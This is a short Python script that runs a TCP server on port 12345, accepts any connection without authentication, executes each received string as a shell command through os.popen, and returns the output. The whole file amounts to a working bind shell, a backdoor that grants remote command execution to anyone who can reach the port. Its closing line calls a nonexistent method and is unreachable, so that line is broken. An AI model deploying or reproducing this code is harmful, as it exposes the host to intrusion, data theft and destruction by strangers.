import sys
from time import *
from socket import *
import os

bufsize = 1024
host = ''
#print("Hostname:",host)
port = 12345
addr = (host,port)

serve = socket(AF_INET,SOCK_STREAM)
serve.bind(addr)
serve.listen(5)

def get_information(cmd):
    f = os.popen(cmd)
    text = f.read()
    status = f.close()
    return text,status 

while True:
    print("Waiting for the connection...")
    client,addr = serve.accept()
    print("Connecting ...",addr)
    
    while True:
        data = client.recv(bufsize).decode()
        if not data:break
        text,status = get_information(data.strip())
        if not status:
            client.send(str(asctime() + ': ' + data +text).encode())
        else:
            client.send("Error command!".encode())
    client.close()
serve.client()
    
